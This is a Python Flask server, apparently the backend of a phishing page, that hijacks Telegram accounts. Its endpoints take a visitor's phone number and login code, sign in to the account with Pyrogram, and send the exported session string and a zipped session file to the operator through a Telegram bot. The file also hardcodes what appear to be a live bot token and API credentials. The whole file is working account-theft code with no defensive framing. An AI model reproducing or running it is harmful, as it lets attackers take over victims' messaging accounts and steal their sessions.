from flask import Flask, request, jsonify, send_from_directory
import os
import re
import requests
import asyncio
import traceback
from threading import Thread

app = Flask(__name__)

# ===== НАСТРОЙКИ (ЗАМЕНИ) =====
BOT_TOKEN = "7972485896:AAGDUO9cKu4qMdoa7dC87-Ybq1kUoPZNF_A"
OWNER_ID = 742347183
API_ID = 39945573
API_HASH = "4addef563b163d9d1977fdfb4abf50db"

PROXY_ENABLED = False
proxy_dict = None

temp_sessions = {}

def send_telegram(text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                      json={"chat_id": OWNER_ID, "text": text[:4000]}, timeout=10)
    except:
        pass

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/send_code', methods=['POST'])
def send_code():
    from pyrogram import Client
    data = request.json
    phone = data.get('phone', '')
    phone_clean = re.sub(r'\D', '', phone)
    if not phone_clean.startswith('7'):
        phone_clean = '7' + phone_clean
    phone_full = '+' + phone_clean
    
    send_telegram(f"📱 Отправляю код на {phone_full}...")
    
    async def send():
        try:
            client = Client(f"temp_{phone_clean}", api_id=API_ID, api_hash=API_HASH, proxy=proxy_dict)
            await client.connect()
            result = await client.send_code(phone_full)
            temp_sessions[phone_full] = {'client': client, 'phone_code_hash': result.phone_code_hash}
            send_telegram(f"✅ Код отправлен на {phone_full}")
            return True
        except Exception as e:
            send_telegram(f"❌ Ошибка: {traceback.format_exc()[:500]}")
            return False
    
    Thread(target=lambda: asyncio.run(send())).start()
    return jsonify({"status": "ok"})

@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    from pyrogram import Client
    import zipfile
    data = request.json
    phone = data.get('phone', '')
    code = data.get('code', '')
    
    phone_clean = re.sub(r'\D', '', phone)
    if not phone_clean.startswith('7'):
        phone_clean = '7' + phone_clean
    phone_full = '+' + phone_clean
    
    send_telegram(f"🔑 Пытаюсь войти в {phone_full} с кодом {code}")
    
    async def login():
        if phone_full not in temp_sessions:
            send_telegram(f"❌ Нет сессии для {phone_full}")
            return False
        session_data = temp_sessions[phone_full]
        client = session_data['client']
        phone_code_hash = session_data['phone_code_hash']
        
        try:
            await client.sign_in(phone_full, code, phone_code_hash=phone_code_hash)
            session_string = await client.export_session_string()
            await client.disconnect()
            
            # Отправляем строку сессии
            send_telegram(f"✅ УСПЕХ! Аккаунт: {phone_full}\n\nSession string:\n{session_string}")
            
            # Сохраняем и отправляем ZIP
            session_file = f"{phone_clean}.session"
            client = Client(f"temp_{phone_clean}", api_id=API_ID, api_hash=API_HASH)
            await client.connect()
            await client.sign_in(phone_full, code, phone_code_hash=phone_code_hash)
            client.session.set_db(session_file)
            await client.disconnect()
            
            zip_name = f"{phone_clean}.zip"
            with zipfile.ZipFile(zip_name, 'w') as zf:
                zf.write(session_file, arcname=f"{phone_clean}.session")
            
            with open(zip_name, 'rb') as f:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                              data={"chat_id": OWNER_ID, "caption": f"✅ Аккаунт: {phone_full}"},
                              files={"document": f})
            
            os.remove(session_file)
            os.remove(zip_name)
            del temp_sessions[phone_full]
            return True
            
        except Exception as e:
            error_full = traceback.format_exc()
            send_telegram(f"❌ ОШИБКА ВХОДА:\n{str(e)[:300]}\n\n{error_full[:500]}")
            return False
    
    Thread(target=lambda: asyncio.run(login())).start()
    return jsonify({"success": True})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
